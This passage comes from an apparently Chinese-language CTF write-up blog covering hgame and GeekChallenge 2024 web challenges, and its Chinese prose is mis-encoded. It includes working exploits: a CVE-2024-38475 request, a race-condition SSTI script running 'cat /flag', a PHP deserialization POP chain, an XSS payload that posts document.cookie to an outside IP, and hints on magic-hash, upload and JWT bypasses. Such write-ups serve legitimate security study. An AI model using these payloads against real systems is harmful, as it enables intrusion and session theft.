class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>åŠ«æŒè·å¾—sessionï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MTczODU5MzU2N3xEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQldGa2JXbHV84eE9t0yI4-g4qaBupwIa27OI7uqu5Dje4mCGvbFzb2w=</span><br></pre></td></tr></table></figure><p>å¸¦ç€cookieæ‰«ç›®å½•å‘ç°&#x2F;flag<br>ä½¿ç”¨adminçš„cookieè®¿é—®è·å¾—flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;W0w_y0u_5r4_9o0d_4t_xss&#125;</span><br></pre></td></tr></table></figure><h3 id="Level-38475-è§’è½"><a href="#Level-38475-è§’è½" class="headerlink" title="Level 38475 è§’è½"></a>Level 38475 è§’è½</h3><p>ç»è¿‡æœç´¢å‘ç°æ˜¯cve2024-38475<br>ä¼ªé€ è¯·æ±‚è¿›è¡Œå¼€é»‘ç›’</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/usr/local/apache2/app/app.py%3F</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.hgame.vidar.club:32567</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>L1nk/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = <span class="string">&#x27;&#x27;&#x27;Latest message: &#123;&#123;message&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨readæ¥å£<br>ä¸€ä¸ªæ‹¬å·éƒ½ä¸ç»™ï¼Œä¹ä¸€çœ‹æ²¡æ³•ssti<br>ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªæ¥å£æœ‰é—®é¢˜ï¼Œreadmsg()è¿›è¡Œäº†ä¸¤æ¬¡<br>ä¸€æ¬¡åˆ¤æ–­ä¸€æ¬¡å®è£…<br>é‚£ä¹ˆå°±å¯ä»¥ä»¥å…ˆé€šè¿‡åˆ¤æ–­å†æ‰§è¡Œçš„æ–¹å¼ç»•è¿‡è¿™ä¸ªwaf<br>ç¬¬ä¸€æ¬¡çš„æ¶ˆæ¯å¤§ä¸€ç‚¹ï¼Œè¯»å–è¿›æ¥ä¹‹åæœ‰å»¶æ—¶çš„æ•ˆæœ<br>æ„é€ ä¸€ä¸ªå¤šçº¿ç¨‹çš„è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">message</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/send&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å‘é€æ¶ˆæ¯ &#x27;<span class="subst">&#123;message&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/read&#x27;</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è¯»å–æ–‡ä»¶å“åº”ï¼š<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    send_message(<span class="string">&quot;a&quot;</span>*<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">    thread_read = threading.Thread(target=read_file)</span><br><span class="line">    thread_send = threading.Thread(target=send_message, args=(<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[140].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    thread_send.start()</span><br><span class="line">    thread_read.start()</span><br><span class="line">    </span><br><span class="line">    thread_send.join()</span><br><span class="line">    thread_read.join()</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;You-f1Nd-thE-Key_TO-RRRACE-OUUuut295edce&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>geek2024</title>
      <link href="/2025/03/07/geek2024/"/>
      <url>/2025/03/07/geek2024/</url>
      
        <content type="html"><![CDATA[<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>é¢˜ç›®:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç ï¼Œå‘ç°:</p><ul><li>æ¼æ´åˆ©ç”¨ç‚¹åœ¨<code>SYC</code>ç±»çš„<code>file_put_contents</code>ä¸­</li><li>ååºåˆ—åŒ–èµ·å§‹ç‚¹åœ¨<code>lover</code>ç±»</li><li>popé“¾é€»è¾‘ä¸º lover(destruct) -&gt; Geek(get) -&gt; lover(invoke) -&gt; Geek(tostring) -&gt; SYC(call)</li></ul><p>pocå¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span> = <span class="string">&quot;php://filter/write=string.strip_tags|?&gt;php_value auto_prepend_file &#x27;/flag&#x27;\n#/resource=.htaccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>=<span class="string">&#x27;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;abcabc&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22%5C6deimeng&#x27;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„ç»•è¿‡ç‚¹:</p><ul><li>åå…­è¿›åˆ¶ç»•è¿‡<code>$meimeng</code>çš„æ­£åˆ™åŒ¹é…</li><li>ä¼ªåè®®ç»•è¿‡<code>$J1rry</code>çš„<code>file_get_content</code></li><li>ç»•è¿‡æ­»äº¡<code>exit</code>çš„å¤§éƒ¨åˆ†<code>filter</code>è¢«banï¼Œåªèƒ½ä½¿ç”¨<code>strip_tags</code>å†™.htaccessè¿›è¡Œæ–‡ä»¶åŒ…å«</li></ul><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h3><p>XSSé¢˜ç›®<br><img src="/2025/03/07/geek2024/8GLFB4F8_2AE3U36QMA9U.png" alt="alt text"><br>å‘ç°ä¸ä»…æ˜¯starvenå­¦é•¿èƒ½å‘è¡¨ç™½è¯­å¥ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å‘<br>äºæ˜¯è€ƒè™‘<code>sstiæ¨¡ç‰ˆæ³¨å…¥</code><br>ä½†å°è¯•äº†å¤šç§æ¨¡ç‰ˆæ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰ï¼Œä½†æ˜¯æœ‰<code>XSS</code><br>ç‚¹å‡»ä¸‹æ–¹ç¬¬äºŒä¸ªè¶…é“¾æ¥,æç¤º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨POSTä¼ å‚,éšæ„ä¸€ä¸ªurl,æç¤º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your host must be 127.0.0.1 and can be visit</span><br></pre></td></tr></table></figure><p>ä¼ å‚<code>url=http://127.0.0.1</code><br>æç¤º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I have checked your url</span><br></pre></td></tr></table></figure><p>çŒœæµ‹å¯èƒ½ä¼šæµè§ˆå’Œæˆ‘ä»¬åŒæ ·çš„è¡¨ç™½å¢™ï¼ŒåŠ ä¹‹ä¸Šæ–¹æç¤ºcookieä¸­æœ‰gift,ç¡®è®¤æ˜¯XSS<br>æ„é€ åŠ«æŒcookieçš„js:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æäº¤åè·å¾—cookie,æˆåŠŸæ‰¾åˆ°flag</p><h3 id="100-çš„âšª"><a href="#100-çš„âšª" class="headerlink" title="100%çš„âšª"></a>100%çš„âšª</h3><p>flagå†™jsé‡Œäº†ï¼Œå±äºç­¾åˆ°é¢˜<br><img src="/2025/03/07/geek2024/1IITXLBMWMON72D.png" alt="alt text"><br>base64è§£ç å¾—åˆ°flag</p><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p>phpç»•è¿‡ï¼Œé¢˜ç›®:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>start</code>å‚æ•°ä¼ é€’ä¸€ä¸ªæ•°ç»„ç»•è¿‡<br>çœ‹ä¸€ä¸‹<code>md5(&quot;Geekchallenge2024_bmKtL&quot;)</code>çš„å€¼ï¼Œä¸º<code>0e</code>å¼€å¤´,ä¸”åˆ¤æ–­ä¸ºå¼±åˆ¤æ–­<br>ä¼ å‚:<code>_[2024.geekchallenge.ctf=aaroZmOk</code>ç»•è¿‡<br>æœ€åä¸€ä¸ª<code>year</code>æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¼ å‚<code>1e9</code>æˆåŠŸç»•è¿‡</p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>æ–‡ä»¶ä¸Šä¼ <br><img src="/2025/03/07/geek2024/S6ZCG8TUVLB~M4N66RYCY%602.png" alt="alt text"><br>æç¤ºæ˜¯é»‘åå•ç»•è¿‡,é‚£å°±ä¸€ä¸ªä¸€ä¸ªå°è¯•<br>å‘ç°<code>.jpg.php</code>åŒå†™æˆåŠŸç»•è¿‡ï¼Œä½¿ç”¨èšå‰‘ä¸Šé©¬</p><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>é¢˜ç›®æ€»è§ˆå¦‚ä¸‹:<br>Please pass these levels,Starven will give you flag!<br>Level1: please use get parameter welcome<br>Level2 please user two post params username &amp; password<br>Level3 you must from <a href="https://www.sycsec.com/">https://www.sycsec.com</a><br>Level4 you must from local ip<br>Level5 you must let Starven give you flag<br><code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php\r<br></span><span style="color: #007700">if&nbsp;(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">"HTTP_STARVEN"</span><span style="color: #007700">]&nbsp;==&nbsp;</span><span style="color: #DD0000">"I_Want_Flag"</span><span style="color: #007700">)&nbsp;&#123;\r<br>&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"........"</span><span style="color: #007700">;\r<br>&#125;\r<br></span>\n</span>\n</code>haha! Thers is last level,please view your cookie and get flag!<br>where is key?<br>give your cookie : token &#x3D; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjQzNDQsIm5iZiI6MTcyOTg2NDM0NCwiZXhwIjoxNzI5ODcxNTQ0LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.HD4hxKoLUf7lhML184qng96EZiTlMTTtgAD8mvyDLCk<br><!--key is "Starven_secret_key"--><br></p><p>æœ€åpythonä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://80-c245227a-02f4-44c0-82e8-7da81ef7f405.challenge.ctfplus.cn/?welcome=geekchallenge2024&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.sycsec.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Real-Ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;STARVEN&#x27;</span>:<span class="string">&#x27;I_Want_Flag&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;Starven&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;qwert123456&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjIyNTcsIm5iZiI6MTcyOTg2MjI1NywiZXhwIjoxNzI5ODY5NDU3LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.1vbIIz51Roat6PffQNLLraYywbeWqemHz3_uhvkGWvA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,headers=headers,data=data,cookies=cookie)</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜éœ€è¦æ³¨æ„çš„ç‚¹:</p><ul><li>ä¼ªé€ 